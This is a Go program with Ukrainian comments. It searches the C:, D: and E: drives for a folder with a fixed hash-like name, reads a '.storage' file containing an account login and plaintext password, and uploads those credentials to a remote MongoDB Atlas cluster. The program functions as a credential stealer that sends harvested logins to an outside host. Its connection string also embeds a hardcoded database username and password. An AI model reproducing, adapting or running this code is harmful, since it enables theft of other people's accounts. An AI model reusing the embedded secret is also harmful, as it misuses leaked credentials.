package main

import (
	"context"
	"encoding/json"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"sync"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

// Структура для представлення даних з файлу .storage
type StorageData struct {
	Account struct {
		Login    string `json:"login"`
		Password string `json:"password"`
	} `json:"account"`
	Sound bool `json:"sound"`
}

// findFolders виконує рекурсивний пошук папок з заданим ім'ям, починаючи з startPath.
func findFolders(folderName, startPath string) ([]string, error) {
	var results []string

	err := filepath.Walk(startPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			if os.IsPermission(err) {
				return nil
			}
			return err
		}
		if info.IsDir() && info.Name() == folderName {
			results = append(results, path)
			return filepath.SkipDir // Зупиняємо подальший пошук у цій папці
		}
		return nil
	})

	return results, err
}

// loadStorageFile завантажує вміст файлу .storage
func loadStorageFile(filePath string) (StorageData, error) {
	var data StorageData

	file, err := ioutil.ReadFile(filePath)
	if err != nil {
		return data, err
	}

	err = json.Unmarshal(file, &data)
	return data, err
}

// saveToMongoDB зберігає дані в MongoDB
func saveToMongoDB(ctx context.Context, data StorageData, client *mongo.Client) error {
	collection := client.Database("quantik").Collection("quantik")
	_, err := collection.InsertOne(ctx, bson.M{
		"login":    data.Account.Login,
		"password": data.Account.Password,
		"sound":    data.Sound,
	})
	return err
}

// processStorageFile обробляє файл .storage
func processStorageFile(ctx context.Context, filePath string, client *mongo.Client, wg *sync.WaitGroup) {
	defer wg.Done()

	data, err := loadStorageFile(filePath)
	if err != nil {
		log.Printf("Помилка завантаження файлу .storage: %v\n", err)
		return
	}

	if err := saveToMongoDB(ctx, data, client); err != nil {
		log.Printf("Помилка збереження в MongoDB: %v\n", err)
	} else {
		log.Println("Дані успішно збережено в MongoDB.")
	}
}

func main() {
	ctx := context.Background()
	clientOptions := options.Client().ApplyURI("mongodb+srv://own:UR%40eL97PadVTTFjG@cluster0.uznqi.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
	client, err := mongo.Connect(ctx, clientOptions)
	if err != nil {
		log.Fatalf("Помилка підключення до MongoDB: %v\n", err)
	}
	defer func() {
		if err := client.Disconnect(ctx); err != nil {
			log.Printf("Помилка відключення від MongoDB: %v\n", err)
		}
	}()

	folderName := "c8027ee64beb0bc57524f3f2011ac3a1"
	startPaths := []string{"C:\\", "D:\\", "E:\\"} // Додаємо диски або папки для пошуку
	found := false // Змінна для відстеження, чи була знайдена папка

	var wg sync.WaitGroup

	for _, startPath := range startPaths {
		if found {
			break // Виходимо з циклу, якщо вже знайдено
		}

		log.Printf("Пошук на диску: %s\n", startPath)
		results, err := findFolders(folderName, startPath)
		if err != nil {
			log.Printf("Помилка під час пошуку: %v\n", err)
			continue
 }

		if len(results) > 0 {
			for _, result := range results {
				log.Printf("Знайдено папку: %s\n", result)

				storageFilePath := filepath.Join(result, ".storage")
				if _, err := os.Stat(storageFilePath); err == nil {
					wg.Add(1)
					go processStorageFile(ctx, storageFilePath, client, &wg)
					found = true // Встановлюємо, що папка знайдена
					break // Виходимо з циклу, оскільки знайшли першу папку
				} else if os.IsNotExist(err) {
					log.Printf("Файл .storage не знайдено в папці: %s\n", result)
				} else {
					log.Printf("Помилка перевірки файлу .storage: %v\n", err)
				}
			}
		} else {
			log.Println("Папки не знайдено.")
		}
	}

	wg.Wait() // Чекаємо завершення всіх горутин
}